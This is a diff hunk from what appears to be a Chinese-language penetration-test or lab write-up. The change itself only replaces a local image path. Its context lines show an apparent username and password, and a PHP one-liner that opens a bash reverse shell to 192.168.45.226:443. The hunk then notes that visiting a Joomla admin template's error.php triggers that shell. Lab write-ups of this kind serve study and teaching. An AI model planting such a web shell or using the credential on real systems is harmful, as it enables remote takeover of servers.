@@ -106,7 +106,7 @@ lewis:P4ntherg0t1n5r3c0n##
 <?php system('bash -c "bash -i >& /dev/tcp/192.168.45.226/443 0>&1"'); ?>
 ```
 
-![image-20231128132648734](C:\Users\root\AppData\Roaming\Typora\typora-user-images\image-20231128132648734.png)
+![image-20231128132648734](/image/image-20231128132648734.png)
 
 访问/administrator/templates/atum/error.php触发反弹shell命令
 
